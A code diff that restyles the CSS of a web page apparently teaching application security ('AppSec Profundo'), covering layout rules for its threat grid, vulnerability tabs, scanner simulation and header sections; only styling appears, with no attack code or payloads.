@@ -6,249 +6,239 @@
 <title>CIPHER — Cap. 06: AppSec Profundo</title>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Bebas+Neue&family=Crimson+Pro:ital,wght@0,300;0,400;1,300&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --black: #060508;
-    --orange: #ff6b1a;
-    --orange-dim: rgba(255,107,26,0.08);
-    --yellow: #ffd166;
-    --green: #06d6a0;
-    --red: #ef233c;
-    --blue: #4cc9f0;
-    --white: #eae7e0;
-    --gray: #48485a;
-    --mono: 'Share Tech Mono', monospace;
-    --display: 'Bebas Neue', sans-serif;
-    --body: 'Crimson Pro', Georgia, serif;
-  }
-  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-  html{scroll-behavior:smooth}
-  body{background:var(--black);color:var(--white);font-family:var(--body);font-weight:300;line-height:1.7;overflow-x:hidden}
+:root{
+  --black:#060508;--orange:#ff6b1a;--yellow:#ffd166;
+  --green:#06d6a0;--red:#ef233c;--blue:#4cc9f0;
+  --white:#eae7e0;--gray:#48485a;
+  --mono:'Share Tech Mono',monospace;
+  --display:'Bebas Neue',sans-serif;
+  --body:'Crimson Pro',Georgia,serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--black);color:var(--white);font-family:var(--body);font-weight:300;line-height:1.7;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,107,26,0.007) 2px,rgba(255,107,26,0.007) 4px);pointer-events:none;z-index:9999}
 
-  /* scanlines */
-  body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,107,26,0.007) 2px,rgba(255,107,26,0.007) 4px);pointer-events:none;z-index:9999}
+/* NAV */
+nav{position:fixed;top:0;left:0;right:0;z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:1.2rem 3rem;background:linear-gradient(to bottom,rgba(6,5,8,0.98),transparent);border-bottom:1px solid rgba(255,107,26,0.08)}
+.nav-logo{font-family:var(--display);font-size:1.8rem;letter-spacing:0.3em;color:var(--orange);text-decoration:none}
+.nav-logo span{color:var(--white)}
+.nav-links{display:flex;gap:2rem;list-style:none}
+.nav-links a{font-family:var(--mono);font-size:0.68rem;color:var(--gray);text-decoration:none;letter-spacing:0.15em;text-transform:uppercase;transition:color 0.2s}
+.nav-links a:hover{color:var(--orange)}
+.nav-prev{font-family:var(--mono);font-size:0.65rem;color:var(--gray);text-decoration:none;transition:color 0.2s}
+.nav-prev:hover{color:var(--white)}
 
-  /* NAV */
-  nav{position:fixed;top:0;left:0;right:0;z-index:1000;display:flex;align-items:center;justify-content:space-between;padding:1.2rem 3rem;background:linear-gradient(to bottom,rgba(6,5,8,0.98),transparent);border-bottom:1px solid rgba(255,107,26,0.08)}
-  .nav-logo{font-family:var(--display);font-size:1.8rem;letter-spacing:0.3em;color:var(--orange);text-decoration:none}
-  .nav-logo span{color:var(--white)}
-  .nav-links{display:flex;gap:2rem;list-style:none}
-  .nav-links a{font-family:var(--mono);font-size:0.68rem;color:var(--gray);text-decoration:none;letter-spacing:0.15em;text-transform:uppercase;transition:color 0.2s}
-  .nav-links a:hover{color:var(--orange)}
-  .nav-prev{font-family:var(--mono);font-size:0.65rem;color:var(--gray);text-decoration:none;transition:color 0.2s}
-  .nav-prev:hover{color:var(--white)}
+/* HERO */
+.hero{min-height:100vh;display:grid;grid-template-columns:1fr 1fr;position:relative;overflow:hidden}
+.hero-left{display:flex;flex-direction:column;justify-content:flex-end;padding:8rem 3rem 5rem;position:relative;z-index:2}
+.hero-right{position:relative;overflow:hidden}
+#hero-canvas{position:absolute;inset:0;width:100%;height:100%}
+.hero-right-overlay{position:absolute;inset:0;background:linear-gradient(to right,var(--black) 0%,transparent 30%)}
+.chapter-tag{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.3em;text-transform:uppercase;margin-bottom:1.5rem;display:flex;align-items:center;gap:1rem}
+.chapter-tag::after{content:'';flex:0 0 40px;height:1px;background:var(--orange)}
+.hero h1{font-family:var(--display);font-size:clamp(4rem,8vw,9.5rem);line-height:0.88;letter-spacing:0.02em;color:var(--white)}
+.hero h1 .o{color:var(--orange)}.hero h1 .y{color:var(--yellow)}
+.hero-sub{font-size:1.1rem;color:rgba(234,231,224,0.45);line-height:1.85;font-style:italic;margin-top:1.5rem;max-width:480px}
+.hero-tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-top:2rem}
+.htag{font-family:var(--mono);font-size:0.6rem;padding:0.25rem 0.7rem;letter-spacing:0.1em;border:1px solid rgba(255,107,26,0.25);color:rgba(255,107,26,0.7)}
 
-  /* HERO */
-  .hero{min-height:100vh;display:grid;grid-template-columns:1fr 1fr;position:relative;overflow:hidden}
-  .hero-left{display:flex;flex-direction:column;justify-content:flex-end;padding:8rem 3rem 5rem;position:relative;z-index:2;background:linear-gradient(135deg,rgba(255,107,26,0.03) 0%,transparent 60%)}
-  .hero-right{position:relative;overflow:hidden}
-  #hero-canvas{position:absolute;inset:0;width:100%;height:100%}
-  .hero-right-overlay{position:absolute;inset:0;background:linear-gradient(to right,var(--black) 0%,transparent 30%)}
-  .chapter-tag{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.3em;text-transform:uppercase;margin-bottom:1.5rem;display:flex;align-items:center;gap:1rem}
-  .chapter-tag::after{content:'';flex:0 0 40px;height:1px;background:var(--orange)}
-  .hero h1{font-family:var(--display);font-size:clamp(4rem,8vw,9.5rem);line-height:0.88;letter-spacing:0.02em;color:var(--white)}
-  .hero h1 .o{color:var(--orange)}
-  .hero h1 .y{color:var(--yellow)}
-  .hero-sub{font-size:1.1rem;color:rgba(234,231,224,0.45);line-height:1.85;font-style:italic;margin-top:1.5rem;max-width:480px}
-  .hero-tags{display:flex;flex-wrap:wrap;gap:0.5rem;margin-top:2rem}
-  .htag{font-family:var(--mono);font-size:0.6rem;padding:0.25rem 0.7rem;letter-spacing:0.1em;border:1px solid rgba(255,107,26,0.25);color:rgba(255,107,26,0.7)}
+/* SHARED */
+.section{padding:8rem 3rem;position:relative}
+.section-inner{max-width:1100px;margin:0 auto}
+.sec-label{font-family:var(--mono);font-size:0.6rem;color:var(--orange);letter-spacing:0.35em;text-transform:uppercase;margin-bottom:1rem}
+.sec-h2{font-family:var(--display);font-size:clamp(2.5rem,5vw,5rem);letter-spacing:0.04em;line-height:1.05;color:var(--white)}
+.sec-h2 em{font-style:normal;color:var(--orange)}
+.sec-sub{font-size:1.05rem;color:rgba(234,231,224,0.4);font-style:italic;margin-top:0.8rem;max-width:620px}
+.fade-in{opacity:0;transform:translateY(16px);transition:opacity 0.6s,transform 0.6s}
+.fade-in.visible{opacity:1;transform:translateY(0)}
 
-  /* SHARED */
-  .section{padding:8rem 3rem;position:relative}
-  .section-inner{max-width:1100px;margin:0 auto}
-  .sec-label{font-family:var(--mono);font-size:0.6rem;color:var(--orange);letter-spacing:0.35em;text-transform:uppercase;margin-bottom:1rem}
-  .sec-h2{font-family:var(--display);font-size:clamp(2.5rem,5vw,5rem);letter-spacing:0.04em;line-height:1.05;color:var(--white)}
-  .sec-h2 em{font-style:normal;color:var(--orange)}
-  .sec-sub{font-size:1.05rem;color:rgba(234,231,224,0.4);font-style:italic;margin-top:0.8rem;max-width:620px}
-  .fade-in{opacity:0;transform:translateY(16px);transition:opacity 0.6s,transform 0.6s}
-  .fade-in.visible{opacity:1;transform:translateY(0)}
+/* THREAT GRID */
+.threat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:rgba(255,107,26,0.08);margin-top:4rem}
+.threat-card{background:var(--black);padding:2rem;position:relative;transition:background 0.3s}
+.threat-card:hover{background:rgba(255,107,26,0.03)}
+.threat-sev{font-family:var(--display);font-size:3.5rem;line-height:1;margin-bottom:0.5rem}
+.sev-c{color:var(--red)}.sev-h{color:var(--orange)}.sev-m{color:var(--yellow)}
+.threat-name{font-family:var(--mono);font-size:0.7rem;color:var(--white);letter-spacing:0.1em;margin-bottom:0.4rem;text-transform:uppercase}
+.threat-desc{font-size:0.88rem;color:rgba(234,231,224,0.45);line-height:1.55}
+.threat-pill{position:absolute;top:1rem;right:1rem;font-family:var(--mono);font-size:0.5rem;padding:0.15rem 0.4rem;letter-spacing:0.1em;text-transform:uppercase}
+.pill-c{background:rgba(239,35,60,0.1);border:1px solid rgba(239,35,60,0.25);color:var(--red)}
+.pill-h{background:rgba(255,107,26,0.1);border:1px solid rgba(255,107,26,0.25);color:var(--orange)}
+.pill-m{background:rgba(255,209,102,0.08);border:1px solid rgba(255,209,102,0.2);color:var(--yellow)}
 
-  /* ── THREAT MODEL ── */
-  .threat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:rgba(255,107,26,0.08);margin-top:4rem}
-  .threat-card{background:var(--black);padding:2rem;position:relative;overflow:hidden;transition:background 0.3s;cursor:default}
-  .threat-card:hover{background:rgba(255,107,26,0.03)}
-  .threat-sev{font-family:var(--display);font-size:3.5rem;line-height:1;margin-bottom:0.5rem}
-  .sev-crit{color:var(--red)}
-  .sev-high{color:var(--orange)}
-  .sev-med{color:var(--yellow)}
-  .sev-low{color:var(--green)}
-  .threat-name{font-family:var(--mono);font-size:0.7rem;color:var(--white);letter-spacing:0.1em;margin-bottom:0.4rem;text-transform:uppercase}
-  .threat-desc{font-size:0.88rem;color:rgba(234,231,224,0.45);line-height:1.55}
-  .threat-pill{position:absolute;top:1rem;right:1rem;font-family:var(--mono);font-size:0.5rem;padding:0.15rem 0.4rem;letter-spacing:0.1em;text-transform:uppercase}
-  .pill-c{background:rgba(239,35,60,0.1);border:1px solid rgba(239,35,60,0.25);color:var(--red)}
-  .pill-h{background:rgba(255,107,26,0.1);border:1px solid rgba(255,107,26,0.25);color:var(--orange)}
-  .pill-m{background:rgba(255,209,102,0.08);border:1px solid rgba(255,209,102,0.2);color:var(--yellow)}
+/* VULN TABS */
+.vuln-nav{display:flex;gap:0;margin-top:4rem;overflow-x:auto;border-bottom:1px solid rgba(255,255,255,0.06)}
+.vuln-tab{font-family:var(--mono);font-size:0.62rem;letter-spacing:0.08em;padding:0.8rem 1.4rem;color:var(--gray);cursor:pointer;border-bottom:2px solid transparent;transition:all 0.2s;white-space:nowrap;text-transform:uppercase}
+.vuln-tab.active{color:var(--orange);border-bottom-color:var(--orange);background:rgba(255,107,26,0.03)}
+.vuln-pane{display:none}
+.vuln-pane.active{display:grid;grid-template-columns:1fr 1fr;gap:3rem;padding-top:2.5rem}
+.vuln-theory h3{font-family:var(--display);font-size:2rem;letter-spacing:0.05em;color:var(--white);margin-bottom:0.8rem}
+.vuln-theory p{font-size:1rem;color:rgba(234,231,224,0.55);line-height:1.8;margin-bottom:0.8rem}
+.attack-payload{font-family:var(--mono);font-size:0.78rem;padding:1rem 1.2rem;background:rgba(239,35,60,0.05);border:1px solid rgba(239,35,60,0.15);color:var(--red);margin:1rem 0;line-height:1.9;white-space:pre}
+.payload-label{font-size:0.55rem;color:rgba(239,35,60,0.5);letter-spacing:0.15em;text-transform:uppercase;display:block;margin-bottom:0.5rem;white-space:normal}
+.defense-note{padding:0.8rem 1rem;background:rgba(6,214,160,0.04);border:1px solid rgba(6,214,160,0.1);font-family:var(--mono);font-size:0.68rem;color:var(--green);line-height:1.7;margin-top:1rem}
+.vuln-code-col{display:flex;flex-direction:column;gap:0.8rem}
+.cblock{font-family:var(--mono);font-size:0.74rem;line-height:1.85;padding:1.2rem;overflow-x:auto}
+.cblock pre{margin:0;white-space:pre-wrap;word-break:break-all}
+.cb-bad{background:rgba(239,35,60,0.04);border:1px solid rgba(239,35,60,0.15)}
+.cb-good{background:rgba(6,214,160,0.03);border:1px solid rgba(6,214,160,0.12)}
+.cb-label{font-size:0.55rem;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem;display:block}
+.lbl-bad{color:var(--red)}.lbl-good{color:var(--green)}
 
-  /* ── LIVE SCANNER SIMULATION ── */
-  .scanner-wrap{margin-top:4rem;border:1px solid rgba(255,107,26,0.15);overflow:hidden}
-  .scanner-head{background:rgba(255,107,26,0.05);border-bottom:1px solid rgba(255,107,26,0.1);padding:1rem 1.5rem;display:flex;align-items:center;justify-content:space-between}
-  .scanner-title{font-family:var(--mono);font-size:0.7rem;color:var(--orange);letter-spacing:0.15em;text-transform:uppercase}
-  .scanner-status{font-family:var(--mono);font-size:0.6rem;display:flex;align-items:center;gap:0.5rem;color:var(--green)}
-  .scanner-status::before{content:'';width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite}
-  .scanner-body{padding:1.5rem 2rem;display:grid;grid-template-columns:1fr 1fr;gap:2rem}
-  .scan-input-col label{font-family:var(--mono);font-size:0.58rem;color:var(--gray);letter-spacing:0.15em;text-transform:uppercase;display:block;margin-bottom:0.4rem}
-  .scan-url{width:100%;background:transparent;border:1px solid rgba(255,107,26,0.2);color:var(--white);font-family:var(--mono);font-size:0.85rem;padding:0.7rem 1rem;outline:none;transition:border-color 0.2s}
-  .scan-url:focus{border-color:rgba(255,107,26,0.5)}
-  .scan-btn{margin-top:0.8rem;width:100%;background:rgba(255,107,26,0.1);border:1px solid rgba(255,107,26,0.3);color:var(--orange);font-family:var(--mono);font-size:0.7rem;letter-spacing:0.15em;text-transform:uppercase;padding:0.7rem;cursor:pointer;transition:background 0.2s}
-  .scan-btn:hover{background:rgba(255,107,26,0.18)}
-  .scan-results{display:flex;flex-direction:column;gap:0.4rem}
-  .scan-finding{display:flex;align-items:flex-start;gap:0.8rem;font-family:var(--mono);font-size:0.68rem;padding:0.5rem 0.7rem;border:1px solid rgba(255,255,255,0.04);animation:slideIn 0.3s ease}
-  .finding-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;margin-top:0.2rem}
-  .fd-crit{background:var(--red)}.fd-high{background:var(--orange)}.fd-med{background:var(--yellow)}.fd-ok{background:var(--green)}
-  .finding-text{color:rgba(234,231,224,0.65);line-height:1.4}
-  .finding-sev{margin-left:auto;font-size:0.55rem;padding:0.1rem 0.4rem;flex-shrink:0}
-  .fs-c{color:var(--red);border:1px solid rgba(239,35,60,0.25)}.fs-h{color:var(--orange);border:1px solid rgba(255,107,26,0.25)}.fs-m{color:var(--yellow);border:1px solid rgba(255,209,102,0.2)}.fs-ok{color:var(--green);border:1px solid rgba(6,214,160,0.2)}
+/* SCANNER */
+.scanner-wrap{margin-top:4rem;border:1px solid rgba(255,107,26,0.15);overflow:hidden}
+.scanner-head{background:rgba(255,107,26,0.05);border-bottom:1px solid rgba(255,107,26,0.1);padding:1rem 1.5rem;display:flex;align-items:center;justify-content:space-between}
+.scanner-title{font-family:var(--mono);font-size:0.7rem;color:var(--orange);letter-spacing:0.15em;text-transform:uppercase}
+.scanner-status{font-family:var(--mono);font-size:0.6rem;display:flex;align-items:center;gap:0.5rem;color:var(--green)}
+.scanner-status::before{content:'';width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite}
+.scanner-body{padding:1.5rem 2rem;display:grid;grid-template-columns:1fr 1fr;gap:2rem}
+.scan-label{font-family:var(--mono);font-size:0.58rem;color:var(--gray);letter-spacing:0.15em;text-transform:uppercase;display:block;margin-bottom:0.4rem}
+.scan-url{width:100%;background:transparent;border:1px solid rgba(255,107,26,0.2);color:var(--white);font-family:var(--mono);font-size:0.85rem;padding:0.7rem 1rem;outline:none;transition:border-color 0.2s;margin-top:0.4rem}
+.scan-url:focus{border-color:rgba(255,107,26,0.5)}
+.scan-select{width:100%;background:rgba(255,107,26,0.04);border:1px solid rgba(255,107,26,0.2);color:var(--white);font-family:var(--mono);font-size:0.78rem;padding:0.6rem 0.8rem;outline:none;margin-top:0.4rem}
+.scan-btn{margin-top:1rem;width:100%;background:rgba(255,107,26,0.1);border:1px solid rgba(255,107,26,0.3);color:var(--orange);font-family:var(--mono);font-size:0.7rem;letter-spacing:0.15em;text-transform:uppercase;padding:0.7rem;cursor:pointer;transition:background 0.2s}
+.scan-btn:hover{background:rgba(255,107,26,0.18)}
+.scan-results{display:flex;flex-direction:column;gap:0.4rem;min-height:200px}
+.scan-finding{display:flex;align-items:flex-start;gap:0.8rem;font-family:var(--mono);font-size:0.68rem;padding:0.5rem 0.7rem;border:1px solid rgba(255,255,255,0.04);animation:slideIn 0.3s ease}
+.finding-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;margin-top:0.2rem}
+.fd-c{background:var(--red)}.fd-h{background:var(--orange)}.fd-m{background:var(--yellow)}.fd-ok{background:var(--green)}
+.finding-text{color:rgba(234,231,224,0.65);line-height:1.4}
+.finding-sev{margin-left:auto;font-size:0.55rem;padding:0.1rem 0.4rem;flex-shrink:0;border:1px solid}
+.fs-c{color:var(--red);border-color:rgba(239,35,60,0.25)}.fs-h{color:var(--orange);border-color:rgba(255,107,26,0.25)}.fs-m{color:var(--yellow);border-color:rgba(255,209,102,0.2)}.fs-ok{color:var(--green);border-color:rgba(6,214,160,0.2)}
 
-  /* ── VULN DEEP DIVES ── */
-  .vuln-nav{display:flex;gap:0;margin-top:4rem;overflow-x:auto;border-bottom:1px solid rgba(255,255,255,0.06)}
-  .vuln-tab{font-family:var(--mono);font-size:0.62rem;letter-spacing:0.08em;padding:0.8rem 1.4rem;color:var(--gray);cursor:pointer;border-bottom:2px solid transparent;transition:all 0.2s;white-space:nowrap;text-transform:uppercase}
-  .vuln-tab.active{color:var(--orange);border-bottom-color:var(--orange);background:rgba(255,107,26,0.03)}
-  .vuln-tab:hover{color:var(--white)}
-  .vuln-pane{display:none}
-  .vuln-pane.active{display:grid;grid-template-columns:1fr 1fr;gap:3rem;padding-top:2rem}
-  .vuln-theory h3{font-family:var(--display);font-size:2rem;letter-spacing:0.05em;color:var(--white);margin-bottom:0.8rem}
-  .vuln-theory p{font-size:1rem;color:rgba(234,231,224,0.55);line-height:1.8;margin-bottom:0.8rem}
-  .attack-payload{font-family:var(--mono);font-size:0.8rem;padding:1rem;background:rgba(239,35,60,0.05);border:1px solid rgba(239,35,60,0.15);color:var(--red);margin:1rem 0;line-height:1.7}
-  .payload-label{font-size:0.55rem;color:rgba(239,35,60,0.5);letter-spacing:0.15em;text-transform:uppercase;display:block;margin-bottom:0.4rem}
-  .vuln-code-col{display:flex;flex-direction:column;gap:0.8rem}
-  .code-block-sm{font-family:var(--mono);font-size:0.74rem;line-height:1.85;padding:1.2rem;overflow-x:auto}
-  .cb-bad{background:rgba(239,35,60,0.04);border:1px solid rgba(239,35,60,0.15)}
-  .cb-good{background:rgba(6,214,160,0.03);border:1px solid rgba(6,214,160,0.12)}
-  .cb-label{font-size:0.55rem;letter-spacing:0.2em;text-transform:uppercase;margin-bottom:0.5rem;display:block}
-  .lbl-bad{color:var(--red)}.lbl-good{color:var(--green)}
-  .kw{color:#c792ea}.fn{color:var(--yellow)}.str{color:var(--green)}.cm{color:var(--gray);font-style:italic}.dec{color:var(--blue)}.cls{color:#82aaff}.num{color:var(--red)}.vl{color:var(--red)}.gd{color:var(--green)}.or{color:var(--orange)}
+/* INPUT PLAYGROUND */
+.playground-wrap{margin-top:4rem;display:grid;grid-template-columns:1fr 1fr;gap:2px;background:rgba(255,107,26,0.07)}
+.pg-panel{background:var(--black);overflow:hidden}
+.pg-head{padding:0.9rem 1.5rem;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;align-items:center;gap:0.8rem;font-family:var(--mono);font-size:0.62rem;letter-spacing:0.12em;text-transform:uppercase;background:rgba(255,255,255,0.02)}
+.pg-badge-bad{padding:0.15rem 0.5rem;font-size:0.55rem;background:rgba(239,35,60,0.1);border:1px solid rgba(239,35,60,0.25);color:var(--red)}
+.pg-badge-good{padding:0.15rem 0.5rem;font-size:0.55rem;background:rgba(6,214,160,0.08);border:1px solid rgba(6,214,160,0.2);color:var(--green)}
+.pg-body{padding:1.5rem}
+.pg-lbl{font-family:var(--mono);font-size:0.58rem;color:var(--gray);letter-spacing:0.12em;text-transform:uppercase;display:block;margin-bottom:0.4rem;margin-top:1rem}
+.pg-lbl:first-child{margin-top:0}
+.pg-input{width:100%;background:transparent;border:1px solid rgba(255,255,255,0.1);color:var(--white);font-family:var(--mono);font-size:0.82rem;padding:0.6rem 0.8rem;outline:none;transition:border-color 0.2s}
+.pg-input.unsafe:focus{border-color:rgba(239,35,60,0.5)}
+.pg-input.safe:focus{border-color:rgba(6,214,160,0.4)}
+.pg-result{margin-top:0.6rem;padding:0.65rem 1rem;font-family:var(--mono);font-size:0.7rem;min-height:2rem;line-height:1.5;border:1px solid rgba(255,255,255,0.05)}
+.danger{color:var(--red);border-color:rgba(239,35,60,0.2)!important;background:rgba(239,35,60,0.04)}
+.safe-ok{color:var(--green);border-color:rgba(6,214,160,0.15)!important;background:rgba(6,214,160,0.03)}
 
-  /* ── INPUT VALIDATION PLAYGROUND ── */
-  .playground-wrap{margin-top:4rem;display:grid;grid-template-columns:1fr 1fr;gap:2px;background:rgba(255,107,26,0.07)}
-  .pg-panel{background:var(--black);overflow:hidden}
-  .pg-head{padding:0.9rem 1.5rem;border-bottom:1px solid rgba(255,255,255,0.05);display:flex;align-items:center;gap:0.8rem;font-family:var(--mono);font-size:0.62rem;letter-spacing:0.12em;text-transform:uppercase;background:rgba(255,255,255,0.02)}
-  .pg-badge-bad{padding:0.15rem 0.5rem;font-size:0.55rem;background:rgba(239,35,60,0.1);border:1px solid rgba(239,35,60,0.25);color:var(--red)}
-  .pg-badge-good{padding:0.15rem 0.5rem;font-size:0.55rem;background:rgba(6,214,160,0.08);border:1px solid rgba(6,214,160,0.2);color:var(--green)}
-  .pg-body{padding:1.5rem}
-  .pg-label{font-family:var(--mono);font-size:0.58rem;color:var(--gray);letter-spacing:0.12em;text-transform:uppercase;display:block;margin-bottom:0.4rem;margin-top:0.8rem}
-  .pg-input{width:100%;background:transparent;border:1px solid rgba(255,255,255,0.1);color:var(--white);font-family:var(--mono);font-size:0.85rem;padding:0.6rem 0.8rem;outline:none;transition:border-color 0.2s}
-  .pg-input.unsafe:focus{border-color:rgba(239,35,60,0.5)}
-  .pg-input.safe:focus{border-color:rgba(6,214,160,0.4)}
-  .pg-result{margin-top:0.8rem;padding:0.7rem 1rem;font-family:var(--mono);font-size:0.72rem;min-height:2.2rem;line-height:1.5;border:1px solid rgba(255,255,255,0.05)}
-  .pg-result.danger{color:var(--red);border-color:rgba(239,35,60,0.2);background:rgba(239,35,60,0.04)}
-  .pg-result.safe-ok{color:var(--green);border-color:rgba(6,214,160,0.15);background:rgba(6,214,160,0.03)}
-  .pg-result.warn{color:var(--yellow);border-color:rgba(255,209,102,0.2);background:rgba(255,209,102,0.03)}
+/* FILE UPLOAD DIAGRAM */
+.upload-diagram{margin-top:4rem;display:flex;flex-direction:column;gap:2px}
+.upload-step{display:grid;grid-template-columns:160px 1fr 130px;align-items:stretch;gap:0;border:1px solid rgba(255,255,255,0.04);border-top:none;transition:background 0.2s}
+.upload-step:first-child{border-top:1px solid rgba(255,255,255,0.04)}
+.upload-step:hover{background:rgba(255,107,26,0.01)}
+.us-phase{padding:1.2rem 1.5rem;border-right:1px solid rgba(255,255,255,0.04);display:flex;flex-direction:column;justify-content:center}
+.us-num{font-family:var(--display);font-size:1.8rem;color:rgba(255,107,26,0.15);line-height:1}
+.us-name{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.1em;text-transform:uppercase}
+.us-content{padding:1.2rem 1.5rem;font-size:0.9rem;color:rgba(234,231,224,0.55);line-height:1.65}
+.us-content strong{color:var(--white);font-weight:400}
+.us-content code{font-family:var(--mono);font-size:0.78rem;color:var(--orange)}
+.us-status{padding:1.2rem 1rem;display:flex;align-items:center;justify-content:center;border-left:1px solid rgba(255,255,255,0.04)}
+.us-badge{font-family:var(--mono);font-size:0.55rem;padding:0.2rem 0.5rem;letter-spacing:0.1em;text-transform:uppercase;text-align:center}
+.ub-block{background:rgba(239,35,60,0.08);border:1px solid rgba(239,35,60,0.2);color:var(--red)}
+.ub-warn{background:rgba(255,209,102,0.08);border:1px solid rgba(255,209,102,0.2);color:var(--yellow)}
+.ub-pass{background:rgba(6,214,160,0.06);border:1px solid rgba(6,214,160,0.15);color:var(--green)}
 
-  /* ── FILE UPLOAD SECURITY ── */
-  .upload-diagram{margin-top:4rem;display:flex;flex-direction:column;gap:2px}
-  .upload-step{display:grid;grid-template-columns:180px 1fr auto;align-items:stretch;gap:0;border:1px solid rgba(255,255,255,0.04);border-top:none;transition:background 0.2s}
-  .upload-step:first-child{border-top:1px solid rgba(255,255,255,0.04)}
-  .upload-step:hover{background:rgba(255,107,26,0.01)}
-  .us-phase{padding:1.2rem 1.5rem;border-right:1px solid rgba(255,255,255,0.04);display:flex;flex-direction:column;justify-content:center}
-  .us-phase-name{font-family:var(--mono);font-size:0.65rem;color:var(--orange);letter-spacing:0.1em;text-transform:uppercase}
-  .us-phase-num{font-family:var(--display);font-size:1.8rem;color:rgba(255,107,26,0.15);line-height:1}
-  .us-content{padding:1.2rem 1.5rem;font-size:0.9rem;color:rgba(234,231,224,0.55);line-height:1.65}
-  .us-content strong{color:var(--white);font-weight:400}
-  .us-content code{font-family:var(--mono);font-size:0.78rem;color:var(--orange)}
-  .us-status{padding:1.2rem 1.5rem;display:flex;align-items:center;border-left:1px solid rgba(255,255,255,0.04)}
-  .us-badge{font-family:var(--mono);font-size:0.55rem;padding:0.2rem 0.5rem;letter-spacing:0.1em;text-transform:uppercase;white-space:nowrap}
-  .ub-block{background:rgba(239,35,60,0.08);border:1px solid rgba(239,35,60,0.2);color:var(--red)}
-  .ub-warn{background:rgba(255,209,102,0.08);border:1px solid rgba(255,209,102,0.2);color:var(--yellow)}
-  .ub-pass{background:rgba(6,214,160,0.06);border:1px solid rgba(6,214,160,0.15);color:var(--green)}
+/* HEADERS GRID */
+.headers-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:4rem}
+.header-row{padding:1.2rem;border:1px solid rgba(255,255,255,0.05);transition:border-color 0.2s}
+.header-row:hover{border-color:rgba(255,107,26,0.15)}
+.hrow-name{font-family:var(--mono);font-size:0.72rem;color:var(--orange);letter-spacing:0.05em;margin-bottom:0.4rem}
+.hrow-val{font-family:var(--mono);font-size:0.62rem;color:rgba(234,231,224,0.45);word-break:break-all;line-height:1.6;margin-bottom:0.5rem}
+.hrow-why{font-size:0.88rem;color:rgba(234,231,224,0.35);line-height:1.5;font-style:italic;margin-bottom:0.5rem}
+.hrow-status{font-family:var(--mono);font-size:0.55rem;padding:0.1rem 0.4rem;display:inline-block}
+.hs-must{background:rgba(239,35,60,0.08);border:1px solid rgba(239,35,60,0.2);color:var(--red)}
+.hs-should{background:rgba(255,107,26,0.08);border:1px solid rgba(255,107,26,0.2);color:var(--orange)}
+.hs-nice{background:rgba(255,209,102,0.06);border:1px solid rgba(255,209,102,0.15);color:var(--yellow)}
 
-  /* ── HEADERS AUDIT ── */
-  .headers-grid{display:grid;grid-template-columns:1fr 1fr;gap:2rem;margin-top:4rem}
-  .header-row{display:flex;flex-direction:column;gap:0.4rem;padding:1rem;border:1px solid rgba(255,255,255,0.05);transition:border-color 0.2s}
-  .header-row:hover{border-color:rgba(255,107,26,0.15)}
-  .hrow-name{font-family:var(--mono);font-size:0.72rem;color:var(--orange);letter-spacing:0.05em}
-  .hrow-val{font-family:var(--mono);font-size:0.65rem;color:rgba(234,231,224,0.5);word-break:break-all;line-height:1.5}
-  .hrow-why{font-size:0.85rem;color:rgba(234,231,224,0.35);line-height:1.5;font-style:italic}
-  .hrow-status{font-family:var(--mono);font-size:0.55rem;padding:0.1rem 0.4rem;display:inline-block;margin-top:0.2rem}
-  .hs-must{background:rgba(239,35,60,0.08);border:1px solid rgba(239,35,60,0.2);color:var(--red)}
-  .hs-should{background:rgba(255,107,26,0.08);border:1px solid rgba(255,107,26,0.2);color:var(--orange)}
-  .hs-nice{background:rgba(255,209,102,0.06);border:1px solid rgba(255,209,102,0.15);color:var(--yellow)}
+/* DEPENDENCY TABLE */
+.deps-table{margin-top:4rem;display:flex;flex-direction:column;gap:2px}
+.dep-row{display:grid;grid-template-columns:180px 80px 80px 1fr 100px;align-items:center;gap:0;padding:0.8rem 1.2rem;border:1px solid rgba(255,255,255,0.04);transition:background 0.2s}
+.dep-hdr-row{background:rgba(255,107,26,0.02);border-color:rgba(255,107,26,0.1)}
+.dep-row:not(.dep-hdr-row):hover{background:rgba(255,255,255,0.01)}
+.dep-name{font-family:var(--mono);font-size:0.72rem;color:var(--white)}
+.dep-ver{font-family:var(--mono);font-size:0.68rem}
+.dep-ver-ok{color:var(--green)}.dep-ver-bad{color:var(--red)}.dep-ver-warn{color:var(--yellow)}
+.dep-latest{font-family:var(--mono);font-size:0.68rem;color:var(--green)}
+.dep-desc{font-size:0.85rem;color:rgba(234,231,224,0.4)}
+.dep-badge{font-family:var(--mono);font-size:0.55rem;padding:0.15rem 0.5rem;letter-spacing:0.08em;text-transform:uppercase}
+.db-ok{background:rgba(6,214,160,0.06);border:1px solid rgba(6,214,160,0.15);color:var(--green)}
+.db-vuln{background:rgba(239,35,60,0.08);border:1px solid rgba(239,35,60,0.2);color:var(--red)}
+.db-upd{background:rgba(255,209,102,0.06);border:1px solid rgba(255,209,102,0.15);color:var(--yellow)}
+.dep-hdr-label{font-family:var(--mono);font-size:0.58rem;color:var(--gray);letter-spacing:0.12em;text-transform:uppercase}
 
-  /* ── DEPENDENCY SCANNER ── */
-  .deps-table{margin-top:4rem;display:flex;flex-direction:column;gap:2px}
